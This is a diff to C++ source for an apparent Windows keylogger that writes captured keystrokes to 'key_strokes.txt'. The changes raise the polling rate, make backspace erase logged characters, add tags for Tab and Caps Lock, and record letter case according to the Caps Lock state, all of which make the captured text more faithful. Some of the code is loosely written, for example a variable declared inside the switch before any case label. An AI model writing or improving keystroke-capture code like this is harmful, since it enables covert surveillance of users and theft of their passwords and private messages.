@@ -7,6 +7,8 @@
 #include <Windows.h> 
 #include <ctime>
 #include <fstream> 
+#include <io.h>
+#include <fcntl.h>
 
 #define FILE_NAME "key_strokes.txt"
 
@@ -39,7 +41,7 @@ int main()
 			}
 		}
 
-		Sleep(10);
+		Sleep(2); 
 	}
 
 	return 0;
@@ -58,34 +60,60 @@ void LOG(int key, char* file) {
 	//Special key states 
 	switch (key) {
 
-	case 0x10:
-		fprintf(log, "%s", "[SHIFT]");
-		break;
+		int filehandle; 
 
-	case 0x08:
-		fprintf(log, "%s", "[BACK]");
-		break;
+		case 0x10:
+			fprintf(log, "%s", "[SHIFT]");
+			break;
 
-	case 0x0D:
-		fprintf(log, "%s", "\n[RETURN]");
-		break;
+		case 0x08:
+		
+			//Instantiante a file handle 
+			filehandle = open(file, O_RDWR | O_APPEND); 
 
-	case 0x09:
-		fprintf(log, "%s", "    "); 
-		break; 
+			//Remove the last byte in the file 
+			_chsize(filehandle, filelength(filehandle) - 1);
+			break;
 
-	case 0x30A7:
-		fprintf(log, "%s", "\n");
-		fprintf(log, "%s", "\n------------");
-		fprintf(log, "%s", "\n");
-		fprintf(log, "%s", timeStamp());
-		fprintf(log, "%s", "------------");
-		fprintf(log, "%s", "\n");
-		fprintf(log, "%s", "\n");
-		break;
+		case 0x0D:
+			fprintf(log, "%s", "\n[ENTER]");
+			break;
+
+		case 0x09:
+			fprintf(log, "%s", "[TAB]"); 
+			break; 
+
+		case 0x14: 
+			fprintf(log, "%s", "[CAPS]"); 
+			break; 
+
+		case 0x30A7:
+			fprintf(log, "%s", "\n");
+			fprintf(log, "%s", "\n------------");
+			fprintf(log, "%s", "\n");
+			fprintf(log, "%s", timeStamp());
+			fprintf(log, "%s", "------------");
+			fprintf(log, "%s", "\n");
+			fprintf(log, "%s", "\n");
+			break;
 
 	default:
-		fprintf(log, "%s", &key);
+
+		//Check the low order bits
+		//Stay uppercase if condition is met 
+		if ((GetKeyState(0x14) & 0x0001) != 0) {
+
+			fprintf(log, "%s", &key);
+		}
+
+		//Convert to lower 
+		else {
+
+			int k = (int)tolower( (char)key );
+
+			fprintf(log, "%s", &k);
+		}
+
 		break;
 	}
 
